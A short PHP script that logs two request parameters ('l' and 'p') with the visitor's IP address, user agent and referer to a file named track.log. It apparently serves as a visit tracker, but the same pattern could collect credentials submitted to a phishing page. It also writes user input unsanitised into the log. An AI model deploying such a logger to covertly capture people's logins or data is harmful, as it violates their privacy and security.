<?php
	
	function _g($name) {
		return isset($_GET[$name]) ? $_GET[$name] : (isset($_POST[$name]) ? $_POST[$name] : null);
	}
	
	$arr = [
				_g('l'),
				_g('p'),
				$_SERVER['REMOTE_ADDR'],				
				$_SERVER['HTTP_USER_AGENT'],
				$_SERVER['HTTP_REFERER']
			];
			
	$myfile = fopen('track.log', 'a') or die("Unable to open file!");
	fwrite($myfile, implode(';', $arr) . "\n");
	fclose($myfile);